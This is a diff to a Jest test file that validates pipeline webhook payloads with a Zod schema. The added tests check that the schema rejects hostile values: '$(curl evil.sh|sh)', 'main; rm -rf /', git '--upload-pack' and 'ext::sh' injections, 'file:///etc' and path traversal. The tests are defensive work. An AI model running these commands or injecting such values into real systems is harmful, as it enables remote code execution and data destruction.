@@ -1,27 +1,18 @@
 /**
  * Unit tests for the pipeline webhook payload schema validation.
  *
- * These tests use the Zod schema directly — no HTTP server, DB, or Redis
+ * These tests use the exported Zod schema directly — no HTTP server, DB, or Redis
  * required. They verify that the API correctly accepts valid payloads and
  * rejects malformed ones before any business logic runs.
  */
 
-import { z } from 'zod';
+import { PipelinePayloadSchema } from '../webhooks/pipeline';
 
-// --- Replicate the schema exactly as defined in pipeline.ts ---
-// (We import it as a standalone Zod schema to keep tests DB-free)
-const PipelinePayloadSchema = z.object({
-  commit_sha: z.string().min(7).max(40),
-  service_name: z.string().min(1).max(100),
-  branch: z.string().optional().default('main'),
-  author: z.string().optional().default('unknown'),
-  status: z.enum(['pending', 'running', 'success', 'failed']).default('running'),
-  environment: z.enum(['staging', 'production']).default('staging'),
-  pipeline_url: z.string().url().optional(),
-  commit_message: z.string().optional(),
-  language: z.string().optional(),
-  repo_url: z.string().optional(),
-});
+// pipeline.ts imports DB/Redis/WebSocket modules — stub them so no connections are opened
+jest.mock('../services/serviceService', () => ({}));
+jest.mock('../services/deploymentService', () => ({}));
+jest.mock('../db/redis', () => ({ scanQueue: { add: jest.fn() } }));
+jest.mock('../websocket/index', () => ({ wsEvents: {} }));
 
 describe('Pipeline Webhook — Payload Schema Validation', () => {
   const validPayload = {
@@ -89,5 +80,54 @@ describe('Pipeline Webhook — Payload Schema Validation', () => {
       environment: 'production',
     });
     expect(result.success).toBe(true);
+  });
+
+  it('should reject a commit_sha containing shell syntax', () => {
+    const result = PipelinePayloadSchema.safeParse({
+      ...validPayload,
+      commit_sha: '$(curl evil.sh|sh)',
+    });
+    expect(result.success).toBe(false);
+  });
+
+  it('should reject branch names with shell syntax or a leading dash', () => {
+    for (const branch of ['main; rm -rf /', '--upload-pack=touch /tmp/x', 'a..b', '$(id)']) {
+      expect(PipelinePayloadSchema.safeParse({ ...validPayload, branch }).success).toBe(false);
+    }
+  });
+
+  it('should accept common branch names', () => {
+    for (const branch of ['main', 'feat/guest-demo-mode', 'release-1.2.3', 'deploy_testing']) {
+      expect(PipelinePayloadSchema.safeParse({ ...validPayload, branch }).success).toBe(true);
+    }
+  });
+
+  it('should only accept plain https GitHub repo URLs', () => {
+    const ok = ['https://github.com/yuvrajgohil24/DevLens', 'https://github.com/yuvrajgohil24/DevLens.git'];
+    const bad = [
+      'https://github.com/a/b; rm -rf /',
+      'file:///etc',
+      'https://evil.com/a/b',
+      'https://github.com/a/b/../../c',
+      'ext::sh -c touch% /tmp/pwned',
+    ];
+    for (const repo_url of ok) {
+      expect(PipelinePayloadSchema.safeParse({ ...validPayload, repo_url }).success).toBe(true);
+    }
+    for (const repo_url of bad) {
+      expect(PipelinePayloadSchema.safeParse({ ...validPayload, repo_url }).success).toBe(false);
+    }
+  });
+
+  it('should reject repo URLs from a different owner when GITHUB_OWNER is set', () => {
+    const previous = process.env.GITHUB_OWNER;
+    process.env.GITHUB_OWNER = 'yuvrajgohil24';
+    try {
+      expect(PipelinePayloadSchema.safeParse({ ...validPayload, repo_url: 'https://github.com/YuvrajGohil24/DevLens' }).success).toBe(true);
+      expect(PipelinePayloadSchema.safeParse({ ...validPayload, repo_url: 'https://github.com/someone-else/repo' }).success).toBe(false);
+    } finally {
+      if (previous === undefined) delete process.env.GITHUB_OWNER;
+      else process.env.GITHUB_OWNER = previous;
+    }
   });
 });
